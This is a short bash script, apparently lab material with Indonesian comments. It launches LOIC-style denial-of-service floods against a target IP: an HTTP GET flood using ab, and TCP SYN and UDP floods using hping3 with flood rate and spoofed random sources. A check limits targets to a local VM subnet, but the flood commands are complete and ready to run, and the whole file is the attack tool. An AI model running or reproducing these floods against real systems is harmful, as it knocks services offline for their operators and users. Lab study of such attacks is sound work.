#!/usr/bin/env bash
# attacker-loic.sh — LOIC-style HTTP flood / TCP flood / UDP flood
# VM lab only. Hanya subnet 192.168.56.x diizinkan.
set -Eeuo pipefail

TARGET_IP="${TARGET_IP:-192.168.56.103}"
ATTACK_MODE="${ATTACK_MODE:-http_flood}"   # http_flood | tcp_flood | udp_flood
REQUESTS="${REQUESTS:-3000}"
CONCURRENCY="${CONCURRENCY:-30}"
DURATION="${DURATION:-60}"

log() {
  printf '[loic] %s\n' "$*"
}

die() {
  printf '[loic][ERROR] %s\n' "$*" >&2
  exit 1
}

validate_lab_ip() {
  case "$1" in
    192.168.56.*) ;;
    10.*|172.*|127.*|169.254.*|0.*|255.*) die "IP '$1' bukan subnet lab 192.168.56.x. Script dihentikan." ;;
    *.*.*.*) die "IP '$1' tidak diizinkan. Gunakan subnet VM lokal 192.168.56.x saja." ;;
    *) die "IP '$1' tidak valid." ;;
  esac
}

run_http_flood() {
  command -v ab >/dev/null 2>&1 || die "Install dulu: sudo apt install -y apache2-utils"
  log "LOIC HTTP flood: requests=$REQUESTS concurrency=$CONCURRENCY target=http://$TARGET_IP/"
  # Kirim flood HTTP GET dengan ab — meniru high-rate LOIC HTTP mode
  ab -n "$REQUESTS" -c "$CONCURRENCY" -r "http://$TARGET_IP/" || true
}

run_tcp_flood() {
  command -v hping3 >/dev/null 2>&1 || die "Install dulu: sudo apt install -y hping3"
  log "LOIC TCP flood mode: duration=${DURATION}s target=$TARGET_IP:80"
  # Flood TCP SYN ke port 80 dengan rate tinggi (LOIC TCP mode)
  sudo timeout "${DURATION}s" hping3 --syn --flood --rand-source -p 80 "$TARGET_IP" || true
}

run_udp_flood() {
  command -v hping3 >/dev/null 2>&1 || die "Install dulu: sudo apt install -y hping3"
  log "LOIC UDP flood mode: duration=${DURATION}s target=$TARGET_IP:80"
  # Flood UDP ke port 80 (LOIC UDP mode)
  sudo timeout "${DURATION}s" hping3 --udp --flood --rand-source -p 80 "$TARGET_IP" || true
}

main() {
  validate_lab_ip "$TARGET_IP"

  case "$ATTACK_MODE" in
    http_flood) run_http_flood ;;
    tcp_flood)  run_tcp_flood ;;
    udp_flood)  run_udp_flood ;;
    *) die "ATTACK_MODE tidak dikenal: $ATTACK_MODE. Pilih: http_flood, tcp_flood, udp_flood" ;;
  esac

  log "Selesai: LOIC $ATTACK_MODE"
}

main "$@"
